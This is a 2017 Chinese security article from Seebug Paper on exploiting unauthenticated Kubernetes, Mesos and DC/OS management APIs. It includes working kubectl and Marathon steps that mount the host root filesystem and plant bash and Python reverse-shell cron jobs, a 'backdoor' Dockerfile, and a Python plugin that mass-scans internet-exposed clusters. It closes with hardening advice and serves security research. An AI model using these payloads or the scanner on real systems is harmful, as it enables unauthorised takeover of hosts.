<!DOCTYPE html>


<html xmlns:wb="http://open.weibo.com/wb">

<head>
  <meta charset="utf-8"/>
  <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
  <meta property="wb:webmaster" content="ccd3e79934f3322d"/>
  <title>攻击容器集群管理平台</title>
  <meta name="keywords" content="漏洞文档,漏洞分析,安全技术"/>
  <meta name="description" content=""/>

  <meta name="HandheldFriendly" content="True"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>

  <link rel="shortcut icon" href="/static/images/favicon.ico">
  <link rel="stylesheet" type="text/css" href="/static/css/screen.css"/>
  <link rel="stylesheet" type="text/css" href="/static/css/font.css"/>
  <link rel="stylesheet"
        href="//libs.baidu.com/fontawesome/4.0.3/css/font-awesome.min.css">
  <link rel="stylesheet" type="text/css" href="/static/css/prism.css"/>
  <link rel="stylesheet" type="text/css" href="/static/css/monokai.css" media="screen"/>
  <link rel="stylesheet" type="text/css" href="/static/css/custom.css?t=20170821"/>
  <link rel="stylesheet" type="text/css" href="/static/css/print.css?t=20170821" media="print"/>
  <script>
    var _hmt = _hmt || [];
    (function () {
      var hm = document.createElement("script");
      hm.src = "//hm.baidu.com/hm.js?ef67a70a7641da3b52452a05b3bbecae";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>


</head>

<body class="home-template">
<div class="weixin-share-img" style="display: none">
  <img src="/static/images/weixin-share.png" alt="Paper"/>
</div>

<div id="wrapper" class="">

<div id="sidebar">
  <button type="button" class="hamburger is-closed" data-toggle="offcanvas">
    <span class="hamb-top"></span>
    <span class="hamb-middle"></span>
    <span class="hamb-bottom"></span>
  </button>
  <div id="sidebar-content" class="inner">
    <h2 class="blog-title"><a href="/">Paper</a></h2>
    <h3 class="blog-description">安全技术精粹</h3>

    <form id="search" action="/">
      <button type="submit" style="background: #13313f; border: #13313f; position: absolute; right: -4px; margin-top: -3px;">
        <i class="fa fa-search search-button" style="position: absolute;right:10px; margin-top:6px;" > </i>
      </button>
      <input id="search-field" name="keyword" value="" placeholder="Search"/>

    </form>
    <div class="overlay"></div>
    <div id="sidebar-links">
      <ul id="subscription-links">
        <li><a target="_blank" href="/rss/"><i class="fa fa-rss"></i>RSS 订阅</a>
        </li>
        <li><a href="https://www.seebug.org/contribute/paper"><i
            class="fa fa-envelope-o"></i>投稿</a></li>
      </ul>
      <ul id="navigation">
        <li class="nav-" role="presentation"><a href="/"><i
            class="fa fa-angle-right"></i>首页</a></li>
        
  <li class="nav-" role="presentation"><a href="/category/vul-analysis/"><i
      class="fa fa-angle-right"></i>漏洞分析</a></li>

  <li class="nav-" role="presentation"><a href="/category/tools/"><i
      class="fa fa-angle-right"></i>安全工具&amp;安全开发</a></li>

  <li class="nav-" role="presentation"><a href="/category/information/"><i
      class="fa fa-angle-right"></i>情报分析</a></li>

  <li class="nav-" role="presentation"><a href="/category/experience/"><i
      class="fa fa-angle-right"></i>经验心得</a></li>

  <li class="nav-" role="presentation"><a href="/category/web-security/"><i
      class="fa fa-angle-right"></i>Web安全</a></li>

  <li class="nav-" role="presentation"><a href="/category/bin-security/"><i
      class="fa fa-angle-right"></i>二进制安全</a></li>

  <li class="nav-" role="presentation"><a href="/category/mobile-security/"><i
      class="fa fa-angle-right"></i>移动安全</a></li>

  <li class="nav-" role="presentation"><a href="/category/paper-archive/"><i
      class="fa fa-angle-right"></i>纸篓</a></li>

  <li class="nav-" role="presentation"><a href="/category/prime/"><i
      class="fa fa-angle-right"></i>安全基础&amp;教学篇</a></li>


        <li class="nav-" role="presentation"><a href="/call-for-paper/"><i
            class="fa fa-angle-right"></i>如何投稿</a></li>
        <li class="nav-" role="presentation"><a href="https://paper.seebug.org/papers/"><i
            class="fa fa-angle-right"></i>归档文件</a></li>
      </ul>
      <ul id="sidebar-external">
      </ul>
    </div>

    <footer class="site-footer">
      <section class="copyright">Copyright @ 404 Team from Knownsec.</section>
    </footer>
  </div>
</div>

<main>
  <div class="main-inner">
    <section id="results"></section>
    
  <article class="">
    <header class="post-header">

      <h1 class="post-title">攻击容器集群管理平台</h1>

      <span class="post-print">
        <a href="javascript:window.print()">
        <i class="fa fa-print fa-2x" aria-hidden="true"></i>
        </a>
      </span>
      <section class="post-meta">
        <span class="post-time">
          <i class='fa fa-calendar'></i>
          <time datetime="2017-06-26" class="timeago">2 月，3 周 之前</time>
          <time datetime="2017-06-26" class="fulldate">六月 26, 2017</time>
        </span>
        
          <br>
          <i class='fa fa-tag'></i>
          
            <a href="/category/experience/">经验心得</a>
            
          
        








      </section>
    </header>

    <section class="post-content">
      <p><input type="hidden" class="Authorrss"  value="岚光" name="岚光" /></p>
<p>作者：<strong><a href="https://0x0d.im/archives/attack-container-management-platform.html">岚光</a></strong></p>
<h4>0x00 前言</h4>
<p>随着大数据时代的到来，容器化技术（Containerization）运用地越来越广泛，容器集群管理平台也应运而生。</p>
<p>当前主流的容器集群管理技术，包括 Docker 官方的 <code>Docker Swarm</code>、Apache 的 <code>Mesos</code> 和 Google 的 <code>Kubernetes</code>。</p>
<p>其中 Docker Swarm 使用了 Docker 原生的标准 API 来管理容器，另外的 Mesos 和 Kubernetes 都采用了自己的实现方式。</p>
<p>大家或许还记得之前影响广泛的 <code>Docker Remote API</code>（2375 端口）未授权漏洞，那么其他的容器管理平台是否也会存在类似的问题呢？</p>
<h4>0x01 Kubernetes</h4>
<p><img alt="" src="https://images.seebug.org/content/images/2017/06/3390235287.png-w331s" /></p>
<p>根据<a href="https://kubernetes.io/docs/admin/accessing-the-api/#api-server-ports-and-ips">官方文档</a>，API Server 默认会开启两个端口：<code>8080</code> 和 <code>6443</code>。</p>
<p>其中 8080 端口无需认证，应该仅用于测试。6443 端口需要认证，且有 TLS 保护。</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/06/1246305616.png-w331s" /></p>
<p>直接访问 8080 端口会返回可用的 API 列表，如：</p>
<div class="codehilite"><pre><span></span>{
  &quot;paths&quot;: [
    &quot;/api&quot;,
    &quot;/api/v1&quot;,
    &quot;/apis&quot;,
    &quot;/apis/extensions&quot;,
    &quot;/apis/extensions/v1beta1&quot;,
    &quot;/healthz&quot;,
    &quot;/healthz/ping&quot;,
    &quot;/logs/&quot;,
    &quot;/metrics&quot;,
    &quot;/resetMetrics&quot;,
    &quot;/swagger-ui/&quot;,
    &quot;/swaggerapi/&quot;,
    &quot;/ui/&quot;,
    &quot;/version&quot;
  ]
}
</pre></div>


<p>而直接访问 6443 端口会提示无权限：<code>User "system:anonymous" cannot get at the cluster scope.</code></p>
<p>在 <a href="https://www.zoomeye.org/">Zoomeye</a> 搜索：<code>metrics healthz</code>，可以看到使用 Kubernetes 最多是<code>中国</code>和<code>美国</code>。</p>
<p>其中 443 和 8443 端口几乎都是 <code>OpenShift Origin</code>，一个基于 Kubernetes 的企业版容器管理平台，默认需要认证。</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/06/2681652148.png-w331s" /></p>
<p>访问 <code>/ui</code> 会跳转到 <code>dashboard</code> 页面，可以创建、修改、删除容器，查看日志等。</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/06/3933886108.png-w331s" /></p>
<p>Kubernetes 官方提供了一个命令行工具 <a href="https://kubernetes.io/docs/user-guide/kubectl-overview/">kubectl</a>。使用 <code>kubectl</code> 不仅能完成图形界面上的操作，还有个特殊的功能——在容器中执行命令，类似 <code>docker</code> 里的 <code>exec</code> 。</p>
<div class="codehilite"><pre><span></span>// 获得所有节点
&gt; kubectl -s http://1.2.3.4:8080/ get nodes
// 获得所有容器
&gt; kubectl -s http://1.2.3.4:8080/ get pods --all-namespaces=true
// 在 myapp 容器获得一个交互式 shell
&gt; kubectl -s http://1.2.3.4:8080/ --namespace=default exec -it myapp bash
</pre></div>


<p>当然，如果可以控制容器的运行，我们也可以尝试获取宿主机（即 <code>nodes</code>）的权限。</p>
<p>参考 <a href="http://joychou.org/index.php/web/docker-remote-api-unauthorized-access.html">Docker Remote API 未授权访问漏洞利用</a>，流程大体为创建新的容器 -&gt; 挂载宿主机目录 -&gt; 写 <code>/etc/crontab</code> 定时任务反弹 shell。</p>
<p>根据 Kubernetes 文档中<a href="https://kubernetes.io/docs/concepts/storage/volumes/#hostpath">挂载节点目录</a>的例子，可以写一个 <code>myapp.yaml</code>，将节点的根目录挂载到容器的 <code>/mnt</code> 目录。</p>
<div class="codehilite"><pre><span></span><span class="n">apiVersion</span><span class="o">:</span> <span class="n">v1</span>
<span class="n">kind</span><span class="o">:</span> <span class="n">Pod</span>
<span class="n">metadata</span><span class="o">:</span>
  <span class="n">name</span><span class="o">:</span> <span class="n">myapp</span>
<span class="n">spec</span><span class="o">:</span>
  <span class="n">containers</span><span class="o">:</span>
  <span class="o">-</span> <span class="n">image</span><span class="o">:</span> <span class="n">nginx</span>
    <span class="n">name</span><span class="o">:</span> <span class="n">test</span><span class="o">-</span><span class="n">container</span>
    <span class="n">volumeMounts</span><span class="o">:</span>
    <span class="o">-</span> <span class="n">mountPath</span><span class="o">:</span> <span class="o">/</span><span class="n">mnt</span>
      <span class="n">name</span><span class="o">:</span> <span class="n">test</span><span class="o">-</span><span class="n">volume</span>
  <span class="n">volumes</span><span class="o">:</span>
  <span class="o">-</span> <span class="n">name</span><span class="o">:</span> <span class="n">test</span><span class="o">-</span><span class="n">volume</span>
    <span class="n">hostPath</span><span class="o">:</span>
      <span class="n">path</span><span class="o">:</span> <span class="o">/</span>
</pre></div>


<p>然后使用 kubectl 创建容器：</p>
<div class="codehilite"><pre><span></span><span class="o">//</span> <span class="err">由</span> <span class="n">myapp</span><span class="o">.</span><span class="n">yaml</span> <span class="err">创建容器</span>
<span class="o">&gt;</span> <span class="n">kubectl</span> <span class="o">-</span><span class="n">s</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">1.2</span><span class="o">.</span><span class="mf">3.4</span><span class="p">:</span><span class="mi">8080</span><span class="o">/</span> <span class="n">create</span> <span class="o">-</span><span class="n">f</span> <span class="n">myapp</span><span class="o">.</span><span class="n">yaml</span>
<span class="o">//</span> <span class="err">等待容器创建完成</span>
<span class="o">//</span> <span class="err">获得</span> <span class="n">myapp</span> <span class="err">的交互式</span> <span class="n">shell</span>
<span class="o">&gt;</span> <span class="n">kubectl</span> <span class="o">-</span><span class="n">s</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">1.2</span><span class="o">.</span><span class="mf">3.4</span><span class="p">:</span><span class="mi">8080</span><span class="o">/</span> <span class="o">--</span><span class="n">namespace</span><span class="o">=</span><span class="n">default</span> <span class="k">exec</span> <span class="o">-</span><span class="n">it</span> <span class="n">myapp</span> <span class="n">bash</span>
<span class="o">//</span> <span class="err">向</span> <span class="n">crontab</span> <span class="err">写入反弹</span> <span class="n">shell</span> <span class="err">的定时任务</span>
<span class="o">&gt;</span> <span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s2">&quot;* * * * * root bash -i &gt;&amp; /dev/tcp/127.0.0.1/8888 0&gt;&amp;1</span><span class="se">\n</span><span class="s2">&quot;</span> <span class="o">&gt;&gt;</span> <span class="o">/</span><span class="n">mnt</span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">crontab</span>
<span class="o">//</span> <span class="err">也可以用</span> <span class="n">python</span> <span class="err">反弹</span> <span class="n">shell</span>
<span class="o">&gt;</span> <span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s2">&quot;* * * * * root /usr/bin/python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((</span><span class="se">\&quot;</span><span class="s2">127.0.0.1</span><span class="se">\&quot;</span><span class="s2">,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([</span><span class="se">\&quot;</span><span class="s2">/bin/sh</span><span class="se">\&quot;</span><span class="s2">,</span><span class="se">\&quot;</span><span class="s2">-i</span><span class="se">\&quot;</span><span class="s2">]);&#39;</span><span class="se">\n</span><span class="s2">&quot;</span> <span class="o">&gt;&gt;</span> <span class="o">/</span><span class="n">mnt</span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">crontab</span>
</pre></div>


<p>稍等片刻接收到反弹的 shell：</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/06/1384900230.png-w331s" /></p>
<h4>0x02 Mesos</h4>
<p><img alt="" src="https://images.seebug.org/content/images/2017/06/2831171924--1-.png-w331s" /></p>
<p>根据<a href="http://mesos.apache.org/documentation/latest/configuration/">官方文档</a>，<code>Mesos master</code> 默认监听 <code>5050</code> 端口。</p>
<p>Mesos 主界面：</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/06/3262681483.png-w331s" /></p>
<p>Mesos 的 API 可参考 <a href="http://mesos.apache.org/documentation/latest/endpoints/">HTTP Endpoints</a>。</p>
<p>比较有用的一个 API 是 <code>/flags</code>，可以查看系统的配置情况，包括是否开启权限认证。</p>
<p>Mesos 从 <code>1.2</code> 版开始才有了 exec 进入容器的功能：<a href="https://issues.apache.org/jira/browse/MESOS-6460">Mesos Support for Container Attach and Container Exec</a>。</p>
<p>值得吐槽的是 Mesos 的命令行工具居然没有文档，原因是 CLI 依然有很多功能缺失需要重构：<a href="https://issues.apache.org/jira/browse/MESOS-5676">A full redesign of the Mesos CLI</a>。好在有一个 <a href="https://docs.google.com/document/d/1r6Iv4Efu8v8IBrcUTjgYkvZ32WVscgYqrD07OyIglsA/">Design Doc: Mesos CLI</a> 可供参考。</p>
<p>又因为没有一个专门的 Mesos CLI 工具，唯一的一个 <a href="https://github.com/mesosphere/mesos-cli">mesosphere/mesos-cli</a> 也有两年没更新了，所以只能安装 Mesos 来使用命令行。</p>
<p>在 <code>Ubuntu 16.04</code> 下安装：</p>
<div class="codehilite"><pre><span></span><span class="err">//</span> <span class="err">添加源</span>
<span class="err">&gt;</span> <span class="err">cat</span> <span class="err">&lt;&lt;</span> <span class="err">EOF</span> <span class="err">&gt;&gt;</span> <span class="err">/etc/apt/sources.list.d/mesosphere.list</span>
<span class="k">deb</span> <span class="s">http://repos.mesosphere.com/ubuntu</span> <span class="kp">xenial</span> <span class="kp">main</span>
<span class="err">EOF</span>
<span class="err">//</span> <span class="err">更新</span>
<span class="err">&gt;</span> <span class="err">apt-get</span> <span class="err">update</span>
<span class="err">//</span> <span class="err">如果出现签名问题需要导入</span> <span class="err">public</span> <span class="err">key</span>
<span class="err">//</span> <span class="err">&gt;</span> <span class="err">apt-key</span> <span class="err">adv</span> <span class="err">--keyserver</span> <span class="err">keyserver.ubuntu.com</span> <span class="err">--recv-keys</span> <span class="err">DF7D54CBE56151BF</span>
<span class="err">//</span> <span class="err">安装</span> <span class="err">mesos</span>
<span class="err">&gt;</span> <span class="err">apt-get</span> <span class="err">-y</span> <span class="err">install</span> <span class="err">mesos</span>
</pre></div>


<p>安装完成后可以对 <code>Agent</code> 下发任务执行命令（Mesos 版本均为 1.3）：</p>
<div class="codehilite"><pre><span></span>// 设置目标 URL
&gt; mesos config master 1.2.3.4:5050
// 列出正在运行的容器
&gt; mesos ps
// 执行命令（无回显）
&gt; mesos execute --master=1.2.3.4:5050 --name=test --command=&#39;curl 127.0.0.1/`hostname`&#39;
</pre></div>


<p><img alt="" src="https://images.seebug.org/content/images/2017/06/1448769724.png-w331s" /></p>
<p>可惜在 Docker Volume Support in Mesos Containerizer 中未能找到挂载宿主机（Agent）目录的办法，所以无法逃出沙箱获得宿主机权限。</p>
<h4>0x03 DCOS</h4>
<p><img alt="" src="https://images.seebug.org/content/images/2017/06/779544834.png-w331s" /></p>
<p><code>Mesosphere DCOS</code> 是基于 Apache Mesos 的商业化版本。</p>
<p>根据<a href="https://dcos.io/docs/1.9/api/master-routes/">官方文档</a>，<code>API Router</code> 的默认端口是 <code>80</code>（HTTP）和<code>443</code>（HTTPS）。</p>
<p>DCOS 主界面：</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/06/3426025114.png-w331s" /></p>
<p>相比于 Mesos，DCOS 的对应 API 前多了 <code>/mesos/</code>，如在 Mesos 中查看版本号是 <code>/version</code>，在 DCOS 中则是 <code>/mesos/version</code>。</p>
<p>访问 <code>/dcos-metadata/dcos-version.json</code> 可查看 DCOS 的版本号。</p>
<p>访问 <code>/exhibitor/</code> 是 DCOS 自带的 <code>Zookeeper</code> 管理工具：</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/06/3174273688.png-w331s" /></p>
<p>访问 <code>/marathon/</code> 是自带的框架（Framework） <code>Marathon</code>：</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/06/3422093252.png-w331s" /></p>
<p>DCOS 提供了一个强大的<a href="https://dcos.io/docs/1.9/cli/">命令行工具</a>，和 Kubernetes 的类似，也可以进入容器执行命令。</p>
<p>参考 <a href="https://docs.mesosphere.com/1.9/monitoring/debugging/task-exec/">Using dcos task exec</a>，测试一下执行命令（DCOS v1.6.1，DCOS CLI v1.9）：</p>
<div class="codehilite"><pre><span></span>// 设置目标 URL
&gt; dcos config set core.dcos_url http://1.2.3.4
// 根据文档创建一个描述文件
&gt; dcos marathon app add my-app.json
// 在执行 my-app 执行 hostname 命令
&gt; dcos task exec my-app hostname
No container found for the specified task. It might still be spinning up. Please try again.
// 添加一个任务
&gt; dcos job add my-job.json
DC/OS backend does not support metronome capabilities in this version. Must be DC/OS &gt;= 1.8
</pre></div>


<p>居然不能在 <code>my-app</code> 执行命令，可能是 DCOS 版本过低所致，那如果运行一个 Docker 容器呢：</p>
<div class="codehilite"><pre><span></span>&gt; dcos task exec my-docker hostname
This command is only supported for tasks launched by the Universal Container Runtime (UCR).
</pre></div>


<p>根据 <a href="https://docs.mesosphere.com/1.9/deploying-services/containerizers/ucr/">Universal Container Runtime (UCR)</a>，<code>container type</code> 需要指定为 <code>MESOS</code> 才能执行命令，但 UCR 是有<a href="https://docs.mesosphere.com/1.9/deploying-services/containerizers/ucr/#limitations">限制</a>的：</p>
<blockquote>
<p>The UCR does not support the following: runtime privileges, Docker options, force pull, named ports, numbered ports, bridge networking, port mapping, private registries with container authentication.</p>
</blockquote>
<p>所以如果使用 UCR 的话，Docker 将无法挂载外部目录。而如果使用已有的 Docker 基础镜像的话，无法执行我们需要的命令。</p>
<p>想了一下可以用构建自己 Docker 镜像的方法绕过。</p>
<p>参考 <a href="https://docs.mesosphere.com/1.9/deploying-services/creating-services/deploy-docker-app/">Deploying a Docker-based Service</a>，去 https://hub.docker.com 注册一个账号，假设用户名为 <code>test</code>，创建一个公开的 Repository: <code>backdoor</code>。</p>
<p>编写 <code>Dockerfile</code>：</p>
<div class="codehilite"><pre><span></span><span class="n">FROM</span> <span class="n">alpine</span>
<span class="c1"># 容器启动时执行命令</span>
<span class="n">CMD</span> <span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s2">&quot;* * * * * root /usr/bin/python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((</span><span class="se">\&quot;</span><span class="s2">127.0.0.1</span><span class="se">\&quot;</span><span class="s2">,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([</span><span class="se">\&quot;</span><span class="s2">/bin/sh</span><span class="se">\&quot;</span><span class="s2">,</span><span class="se">\&quot;</span><span class="s2">-i</span><span class="se">\&quot;</span><span class="s2">]);&#39;</span><span class="se">\n</span><span class="s2">&quot;</span> <span class="o">&gt;&gt;</span> <span class="o">/</span><span class="n">mnt</span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">crontab</span>
</pre></div>


<p>构建 Docker 镜像并推送到 Docker hub：</p>
<div class="codehilite"><pre><span></span>&gt; docker build -t test/backdoor .
&gt; docker login
&gt; docker push test/backdoor
</pre></div>


<p>写配置文件，使用 <code>backdoor</code> 镜像且挂载宿主机根目录到 <code>/mnt</code>：</p>
<div class="codehilite"><pre><span></span>{
    &quot;id&quot;: &quot;backdoor&quot;,
    &quot;container&quot;: {
    &quot;type&quot;: &quot;DOCKER&quot;,
    &quot;volumes&quot;: [
        {
          &quot;containerPath&quot;: &quot;/mnt&quot;,
          &quot;hostPath&quot;: &quot;/&quot;,
          &quot;mode&quot;: &quot;RW&quot;
        }
      ],
    &quot;docker&quot;: {
          &quot;image&quot;: &quot;test/backdoor&quot;,
          &quot;network&quot;: &quot;BRIDGE&quot;,
          &quot;privileged&quot;: true
        }
    },
    &quot;acceptedResourceRoles&quot;: [&quot;slave_public&quot;],
    &quot;instances&quot;: 1,
    &quot;cpus&quot;: 1,
    &quot;mem&quot;: 1024
}
</pre></div>


<p>最后添加容器到 Marathon：<code>dcos marathon app add backdoor.json</code>。</p>
<p>稍等片刻获得反弹的 shell：</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/06/4266215938.png-w331s" /></p>
<h4>0x04 批量验证</h4>
<p>以 Kubernetes 为例，用 <a href="https://github.com/Xyntax/POC-T">POC-T</a> 可以很方便地从 <code>Zoomeye</code> 的 API 获取数据并进行验证。写一个插件试试：</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="ch">#!/usr/bin/env python</span>
<span class="c1"># -*- coding: utf-8 -*-</span>
<span class="c1"># project = https://github.com/Xyntax/POC-T</span>
<span class="c1"># author =  Oritz</span>
<span class="sd">&quot;&quot;&quot;</span>
<span class="sd">Kubernetes api 未授权访问</span>
<span class="sd">需要安装 kubectl</span>
<span class="sd">  curl -LO https://storage.googleapis.com/kubernetes-release/release/v1.6.1/bin/linux/amd64/kubectl</span>
<span class="sd">  chmod +x ./kubectl</span>
<span class="sd">  sudo mv ./kubectl /usr/local/bin/kubectl</span>
<span class="sd">Usage:</span>
<span class="sd">  python POC-T.py -s kubernetes-unauth -aZ &quot;healthz metrics country:cn&quot; --limit 1000</span>
<span class="sd">&quot;&quot;&quot;</span>
<span class="kn">import</span> <span class="nn">subprocess</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">from</span> <span class="nn">plugin.useragent</span> <span class="kn">import</span> <span class="n">firefox</span>
<span class="k">def</span> <span class="nf">poc</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
    <span class="k">if</span> <span class="s1">&#39;://&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">url</span><span class="p">:</span>
        <span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://&#39;</span> <span class="o">+</span> <span class="n">url</span>
    <span class="k">if</span> <span class="s1">&#39;443&#39;</span> <span class="ow">in</span> <span class="n">url</span><span class="p">:</span>
        <span class="n">url</span> <span class="o">=</span> <span class="n">url</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;http:&#39;</span><span class="p">,</span> <span class="s1">&#39;https:&#39;</span><span class="p">)</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">g</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="n">firefox</span><span class="p">()},</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">3</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">g</span><span class="o">.</span><span class="n">status_code</span> <span class="ow">is</span> <span class="mi">200</span> <span class="ow">and</span> <span class="s1">&#39;healthz&#39;</span> <span class="ow">in</span> <span class="n">g</span><span class="o">.</span><span class="n">content</span> <span class="ow">and</span> <span class="s1">&#39;metrics&#39;</span> <span class="ow">in</span> <span class="n">g</span><span class="o">.</span><span class="n">content</span><span class="p">:</span>
            <span class="n">pods</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">(</span><span class="s2">&quot;kubectl -s </span><span class="si">%s</span><span class="s2"> get pods --all-namespaces=true -o=wide&quot;</span> <span class="o">%</span> <span class="n">url</span><span class="p">,</span>
                                    <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stdin</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="s2">&quot;/dev/null&quot;</span><span class="p">,</span> <span class="s2">&quot;w&quot;</span><span class="p">),</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
            <span class="n">output</span> <span class="o">=</span> <span class="n">pods</span><span class="o">.</span><span class="n">communicate</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&quot;utf-8&quot;</span><span class="p">)</span>
            <span class="k">if</span> <span class="s2">&quot;Please enter Username&quot;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">output</span> <span class="ow">and</span> <span class="s2">&quot;Error from server&quot;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">output</span><span class="p">:</span>
                <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;k8s.txt&quot;</span><span class="p">,</span> <span class="s2">&quot;a&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
                    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="n">output</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
                <span class="k">return</span> <span class="n">url</span>
    <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
        <span class="k">pass</span>
    <span class="k">return</span> <span class="bp">False</span>
</pre></div>
</td></tr></table>

<p>部分结果放在了 gist 上：<a href="https://gist.github.com/Oritz/cef2d915397cd8211300adb519325dbf">k8s.cn.txt</a></p>
<h4>0x05 偶遇挖矿</h4>
<p>在研究过程中发现了部分未授权的 DCOS 被用来挖矿，如查看 DCOS 的任务日志：</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/06/282389608.png-w331s" /></p>
<p>在 Zookeeper 的任务配置里也可以看到：</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/06/2356977786.png-w331s" /></p>
<p>图中的命令和常见的批量扫描主机漏洞并植入挖矿软件的程序很像，所以不大可能是管理员自己运行的。
不过查了一下 Github 上其实早就有开源的<a href="https://github.com/derekchiang/Mesos-Bitcoin-Miner/">基于 Mesos 的分布式比特币挖矿程序</a>了，因为容器管理平台的资源一般都很充裕，可能会成为矿工们的新目标。</p>
<h4>0x06 总结</h4>
<p>文中主要介绍了 Kubernetes 和 Mesos 未授权漏洞的利用方式和获得宿主机权限的攻击方式。容器管理平台未授权访问不仅会泄露容器中的代码、数据库等敏感文件，还有可能导致宿主机被控制进入内网，产生更大的危害。</p>
<p>参考 <a href="http://blog.kubernetes.io/2016/08/security-best-practices-kubernetes-deployment.html">Security Best Practices for Kubernetes Deployment</a>，在安装和运行容器管理平台时，遵循以下几点可提高安全性：</p>
<ul>
<li>配置防火墙，禁止敏感端口对外开放</li>
<li>对管理端口加上认证</li>
<li>使用安全的镜像（私有镜像仓库）</li>
<li>设置容器资源限额</li>
<li>容器以非 root 用户运行</li>
</ul>
<p>文中还有两个问题没有解决：</p>
<ul>
<li>Apache Mesos 如何挂载宿主机目录</li>
<li>DCOS 在容器中执行命令是否有更好的方式</li>
</ul>
<p>如果有意见和建议，欢迎提出。</p>
<h4>0x07 参考</h4>
<ul>
<li><a href="https://segmentfault.com/a/1190000005185138">容器集群管理工具各项对比</a>  </li>
<li><a href="http://dockone.io/article/1138">巅峰对决之 Swarm、Kubernetes、Mesos</a></li>
<li><a href="http://joychou.org/index.php/web/docker-remote-api-unauthorized-access.html">Docker Remote API 未授权访问漏洞利用</a></li>
<li><a href="http://blog.kubernetes.io/2016/08/security-best-practices-kubernetes-deployment.html">Security Best Practices for Kubernetes Deployment</a></li>
</ul>
      
<hr>
<p><img src="https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg" alt="Paper" style="width: 220px">
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<a href="https://paper.seebug.org/332/">https://paper.seebug.org/332/</a></p>
            
    </section>

  <nav class="pagination" role="navigation" style="padding: 3rem;">
    
      <a class="newer-posts" href="/331/"><span aria-hidden="true">&larr;</span> An easy way to pwn most of ...</a>
    
    
      <a class="older-posts" href="/333/">WebLogic反序列化漏洞重现江湖，CVE-2017... <span aria-hidden="true">&rarr;</span></a>
    
  </nav>


    

      
        <footer class="post-footer">
          <figure class="author-image">
            <a class="img" href="/users/author/?nickname=%E5%B2%9A%E5%85%89"
               style="background-image: url(https://images.seebug.org/uploads/2017/08/avatar.png)"><span
                class="hidden">'s Picture</span></a>
          </figure>

          <section class="author">
            <h4><a
                href="/users/author/?nickname=%E5%B2%9A%E5%85%89">岚光</a>
            </h4>
            <p>阅读更多有关<a
                href="/users/author/?nickname=%E5%B2%9A%E5%85%89">该作者</a>的文章
            </p>
            
            <div class="author-meta">
            </div>
          </section>

          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          

        </footer>
      
    
    <br>
    <section class="plugin_comment">
    </section>

  </article>
  <section class="plugin_feedback"></section>

